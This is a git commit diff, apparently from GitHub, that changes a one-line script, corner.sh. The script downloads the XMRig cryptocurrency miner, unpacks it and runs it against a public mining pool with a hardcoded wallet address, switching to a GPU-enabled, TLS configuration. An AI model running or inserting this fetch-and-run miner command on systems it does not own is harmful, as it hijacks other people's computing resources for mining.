15e2fc2a0aca5ddc557da094ba713ab83e744831
Adarsh Gourab Mahalik <71959210+itsmeadarsh2008@users.noreply.github.com>
2023-05-07 21:24:05 +0530

    Update corner.sh

--- corner.sh
+++ corner.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TALFCwj7GajwwmctVsLXdeeDAJKa67sj4d.Cornertech -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig --cuda -o xmrpool.eu:9999 -u 44FRDCj7pMUYAsFcWWckXM3dhHF9qhdCLgCTsB9gvWkxQSWJy3XQjJCcGDpezbcfSBaeqzxfcZT2BMamFTZADZ6ELyNw7me -k --tls
